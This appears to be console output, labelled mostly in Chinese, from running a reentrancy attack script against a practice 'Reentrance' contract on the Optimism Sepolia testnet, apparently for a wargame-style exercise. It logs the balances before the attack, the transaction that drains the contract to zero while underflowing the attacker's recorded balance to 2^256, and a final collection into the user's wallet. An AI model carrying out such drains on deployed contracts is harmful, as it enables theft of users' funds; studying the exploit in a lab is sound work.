@@ -1,0 +1,37 @@
+C:\VScodeProject\Web3\29_Reentrance>npx hardhat run scripts/ReentranceAttacker.js --network optimismSepolia
+目標 Reentrance 實例合約地址: 0x85b96E2122c01C1C3ba0BfB9838cc3523D4176d1
+目標 ReentranceAttacker 實例合約地址: 0x7080733c7BD9E2ad1c2AC64339DBC9503a1Ae82d
+我的帳戶地址:  0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6
+
+我錢包地址的總餘額:  526404420358375026n
+我錢包地址目前在 Reentrance 的餘額:  0n
+ReentranceAttacker 目前在 Reentrance 的餘額:  0n
+Reentrance 的總餘額:  1000000000000000n
+ReentranceAttacker 的總餘額:  0n
+
+Sending 0.001 ETH transaction to donate()...
+交易發送中，交易哈希: 0x48580712a6bcdade1fc7712729a203fbb83284fa38f8b1e05d273d6837fd41c8
+交易確認，區塊號: 25636013
+我錢包地址的總餘額:  525404208170225532n
+我錢包地址目前在 Reentrance 的餘額:  0n
+ReentranceAttacker 目前在 Reentrance 的餘額:  1000000000000000n
+Reentrance 的總餘額:  2000000000000000n
+ReentranceAttacker 的總餘額:  0n
+
+attacker begin attack...
+交易發送中，交易哈希: 0x94d3d7696b8a79bdb0e73ba5de5641e2375394b06294546c714aa01c7ccd0856
+交易確認，區塊號: 25636017
+我錢包地址的總餘額:  524403968795494798n
+我錢包地址目前在 Reentrance 的餘額:  0n
+ReentranceAttacker 目前在 Reentrance 的餘額:  115792089237316195423570985008687907853269984665640564039457582007913129639936n
+Reentrance 的總餘額:  0n
+ReentranceAttacker 的總餘額:  3000000000000000n
+
+collect...
+我錢包地址的總餘額:  527403761269169198n
+我錢包地址目前在 Reentrance 的餘額:  0n
+ReentranceAttacker 目前在 Reentrance 的餘額:  115792089237316195423570985008687907853269984665640564039457582007913129639936n
+Reentrance 的總餘額:  0n
+ReentranceAttacker 的總餘額:  0n
+
+C:\VScodeProject\Web3\29_Reentrance>
